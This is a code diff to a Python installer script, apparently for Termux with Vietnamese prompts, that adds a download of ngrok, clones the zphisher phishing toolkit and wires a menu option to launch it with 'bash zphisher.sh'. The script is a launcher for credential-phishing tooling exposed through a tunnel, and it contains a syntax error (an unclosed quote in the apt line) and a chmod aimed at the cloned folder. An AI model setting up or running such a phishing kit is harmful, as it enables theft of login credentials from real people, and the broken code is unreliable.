@@ -7,8 +7,14 @@ if ip == 'moi':
     os.system('pkg update')
     os.system('pkg upgrade')
     os.system('pkg install wget')
+    os.system('wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip')
     os.system('pkg install php')
     os.system('pkg install curl')
+    os.system('apt upgrade)
+    os.system('git clone https://github.com/htr-tech/zphisher.git') #đổi nhv
+    os.system('ls')
+    os.system('chmod +x zphisher')
+    
     os.system('clear')
     os.system('cd')
     print('Cài đặt hoàn tất!!')
@@ -20,8 +26,7 @@ if ip == 'moi':
     if nhap == '1':
         os.system('php vustar.php')
     if nhap == '2':
-        print('saver đóng')
-        exit()
+        os.system('bash zphisher.sh')
     
 if ip == 'cu':
     os.system('clear')
@@ -32,5 +37,4 @@ if ip == 'cu':
     if nhap == '1':
         os.system('php vustar.php')
     if nhap == '2':
-        print('saver đóng')
-        exit()
+        os.system('bash zphisher.sh')
